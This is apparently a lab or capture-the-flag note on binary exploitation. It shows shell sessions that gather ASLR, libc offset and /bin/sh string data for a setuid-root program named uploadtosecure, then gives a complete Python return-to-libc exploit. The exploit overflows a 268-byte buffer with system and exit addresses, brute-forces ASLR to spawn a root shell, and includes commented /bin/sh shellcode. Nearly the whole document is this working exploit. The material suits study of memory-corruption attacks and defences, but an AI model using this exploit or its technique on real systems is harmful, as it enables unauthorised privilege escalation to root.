URL REF: 
https://bitvijays.github.io/LFC-BinaryExploitation.html

Three Values:
0  : Disable ASLR. This setting is applied if the kernel is booted with the norandmaps boot parameter.
1  : Randomize the positions of the stack, virtual dynamic shared object (VDSO) page, and shared memory regions. The base address of the data segment is located immediately after the end of the executable code segment.
2  : Randomize the positions of the stack, VDSO page, shared memory regions, and the data segment. This is the default setting.

bob@sufferance:/var/tmp$ cat /proc/sys/kernel/randomize_va_space
1
bob@sufferance:/var/tmp$ 


--- Non-Executable Stack, ASLR Enabled ---
bob@sufferance:/var/tmp$ readelf -l uploadtosecure | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
bob@sufferance:/var/tmp$ readelf -l /usr/local/bin/uploadtosecure | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
bob@sufferance:/var/tmp$ ls -l /usr/local/bin/uploadtosecure
-rwsr-xr-x 2 root root 6923 2008-10-07 19:38 /usr/local/bin/uploadtosecure
bob@sufferance:/var/tmp$ readelf -l /bin/scp | grep GNU_STACK
readelf: Error: '/bin/scp': No such file
bob@sufferance:/var/tmp$ which scp
/usr/bin/scp
bob@sufferance:/var/tmp$ readelf -l /usr/bin/scp | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
bob@sufferance:/var/tmp$ for i in `seq 1 5`; do ldd /usr/local/bin/uploadtosecure | grep libc; done
	libc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7e69000)
	libc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7e5a000)
	libc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7e41000)
	libc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7e5e000)
	libc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7e4a000)
bob@sufferance:/var/tmp$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep system
   483: 00035990   125 FUNC    WEAK   DEFAULT   11 system@@GLIBC_2.0
   943: 000f0c40    66 FUNC    GLOBAL DEFAULT   11 svcerr_systemerr@@GLIBC_2.0
  1419: 00035990   125 FUNC    GLOBAL DEFAULT   11 __libc_system@@GLIBC_PRIVATE
bob@sufferance:/var/tmp$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep exit
   189: 000f1990    67 FUNC    GLOBAL DEFAULT   11 svc_exit@@GLIBC_2.0
   214: 000d81b0    52 FUNC    GLOBAL DEFAULT   11 pthread_exit@@GLIBC_2.0
   282: 000df010     5 FUNC    GLOBAL DEFAULT   11 __cyg_profile_func_exit@@GLIBC_2.2
   698: 0012d0c8     4 OBJECT  GLOBAL DEFAULT   31 obstack_exit_failure@@GLIBC_2.0
  1007: 00105630    59 FUNC    GLOBAL DEFAULT   11 atexit@GLIBC_2.0
  1192: 0002b3c0    54 FUNC    WEAK   DEFAULT   11 on_exit@@GLIBC_2.0
  1202: 0002b4f0    60 FUNC    GLOBAL DEFAULT   11 __cxa_atexit@@GLIBC_2.1.3
  1204: 0012d168     4 OBJECT  GLOBAL DEFAULT   31 argp_err_exit_status@@GLIBC_2.1
  1839: 0002b2e0   219 FUNC    GLOBAL DEFAULT   11 exit@@GLIBC_2.0
  1921: 0008de04    24 FUNC    GLOBAL DEFAULT   11 _exit@@GLIBC_2.0
bob@sufferance:/var/tmp$ strings -a -t x /usr/local/bin/uploadtosecure | grep /bin/sh
bob@sufferance:/var/tmp$ strings -a -t x /lib/tls/i686/cmov/libc.so.6 | grep /bin/sh
 1200ae /bin/sh
bob@sufferance:/var/tmp$


--- Exploit ----
cdowns@debian4:~$ cat u2s_exp.py 
#!/usr/bin/env python
# /usr/local/bin/uploadtosecure exploit

from subprocess import call
import struct

#bob@sufferance:/var/tmp$ for i in `seq 1 5`; do ldd /usr/local/bin/uploadtosecure | grep libc ; done
#    libc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7ded000)
#    libc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7e6f000)
#    libc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7e50000)
#    libc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7de7000)
#    libc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7dcd000)
#bob@sufferance:/var/tmp$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep system
#   483:  00035990   125 FUNC    WEAK   DEFAULT   11 system@@GLIBC_2.0
#   943:  000f0c40    66 FUNC    GLOBAL DEFAULT   11 svcerr_systemerr@@GLIBC_2.0
#   1419: 00035990   125 FUNC    GLOBAL DEFAULT   11 __libc_system@@GLIBC_PRIVATE
#bob@sufferance:/var/tmp$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep exit
#   189:  000f1990    67 FUNC    GLOBAL DEFAULT   11 svc_exit@@GLIBC_2.0
#   214:  000d81b0    52 FUNC    GLOBAL DEFAULT   11 pthread_exit@@GLIBC_2.0
#   282:  000df010     5 FUNC    GLOBAL DEFAULT   11 __cyg_profile_func_exit@@GLIBC_2.2
#   698:  0012d0c8     4 OBJECT  GLOBAL DEFAULT   31 obstack_exit_failure@@GLIBC_2.0
#   1007: 00105630    59 FUNC    GLOBAL DEFAULT   11 atexit@GLIBC_2.0
#   1192: 0002b3c0    54 FUNC    WEAK   DEFAULT   11 on_exit@@GLIBC_2.0
#   1202: 0002b4f0    60 FUNC    GLOBAL DEFAULT   11 __cxa_atexit@@GLIBC_2.1.3
#   1204: 0012d168     4 OBJECT  GLOBAL DEFAULT   31 argp_err_exit_status@@GLIBC_2.1
#   1839: 0002b2e0   219 FUNC    GLOBAL DEFAULT   11 exit@@GLIBC_2.0
#   1921: 0008de04    24 FUNC    GLOBAL DEFAULT   11 _exit@@GLIBC_2.0
#bob@sufferance:/var/tmp$ strings -a -t x /lib/tls/i686/cmov/libc.so.6 | grep bin/sh
#   1200ae /bin/sh
#bob@sufferance:/var/tmp$

# vars
libc_base_addr  = 0xb7e9d000 
exit_off        = 0x0002b2e0
system_off      = 0x00035990
system_addr     = libc_base_addr + system_off
exit_addr       = libc_base_addr + exit_off

# hexdump /usr/local/bin/uploadtosecure
system_arg      = 0x00001b0b

#endianess convertion
def conv(num):
     return struct.pack("<I",num)

# /bin/sh shellcode
# buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# Junk + system + exit + system_arg
buf = "A" * 268
buf += conv(system_addr)
buf += conv(exit_addr)
buf += conv(system_arg)

print "++ Calling vulnerable program ++"
i = 0
while (i < 256):
    print "Number of tries: %d" %i
    i += 1
    ret = call(["/usr/local/bin/uploadtosecure", buf])
    if (not ret):
        break
    else:
        print "Exploit failed"

#__ EOF__ #
cdowns@debian4:~$ 



